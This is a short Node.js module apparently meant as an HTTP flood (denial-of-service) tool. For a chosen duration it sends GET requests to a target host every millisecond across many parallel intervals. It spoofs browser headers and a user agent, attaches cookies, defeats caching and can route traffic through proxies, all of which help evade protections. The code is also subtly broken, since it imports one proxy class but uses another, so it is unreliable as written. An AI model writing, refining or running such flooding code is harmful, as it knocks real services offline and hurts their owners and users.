const { request } = require('undici');
const HttpProxyAgent = require('http-proxy-agent');

async function flood(host, duration, rates, userAgent, cookies, headersbro, proxy = null) {
  const headersall = headersbro;
  const endTime = Date.now() + duration * 1000;
  console.log(headersall)
  const agent = proxy ? new HttpsProxyAgent(proxy) : undefined;

  async function sendRequest() {
    try {
      const response = await request(host, {
        method: 'GET',
        headers: {
          'User-Agent': userAgent,
          'accept': headersall['accept'],
	  'accept-language': headersall['accept-language'],
          'accept-encoding': headersall['accept-encoding'],
	  'cache-control': 'no-cache, no-store,private, max-age=0, must-revalidate',
	  'upgrade-insecure-requests': '1',
          'sec-fetch-dest': headersall['sec-fetch-dest'],
	  'sec-fetch-mode': headersall['sec-fetch-mode'],
	  'sec-fetch-site': headersall['sec-fetch-site'],
          'TE': headersall['trailers'],
          'x-requested-with': 'XMLHttpRequest',
          'pragma': 'no-cache',
          'cache-control': 'no-cache',
          Cookie: cookies,
        },
        dispatcher: agent,
      });
    } catch (error) {
     console.log(error);
    }
  }

  // Create a flood process for each CPU core
  for (let i = 0; i < rates; i++) {
    const intervalId = setInterval(() => {
      if (Date.now() >= endTime) {
        clearInterval(intervalId);
      } else {
        sendRequest();
      }
    }, 1);
  }

  console.log(`[INFO] Flood started on ${rates} rates for ${duration} seconds`);
}

module.exports = flood;
